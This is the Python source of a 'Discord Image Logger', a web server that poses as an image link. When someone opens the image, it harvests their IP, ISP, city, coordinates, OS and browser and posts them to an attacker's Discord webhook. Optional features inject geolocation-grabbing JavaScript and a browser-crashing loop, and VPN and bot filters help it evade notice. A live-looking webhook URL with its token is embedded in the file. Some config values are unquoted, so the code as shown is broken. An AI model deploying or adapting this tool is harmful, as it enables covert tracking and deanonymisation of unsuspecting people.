
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": https://discord.com/api/webhooks/1335667587572432947/OUk616TFNWUOlLMNvwkRI9-7d4LoD5pXpzFTfSrTPe5e-GWpAwNWkCsug2djmJzKBJbG,
    "image": data:image/jpeg;base64,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, # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
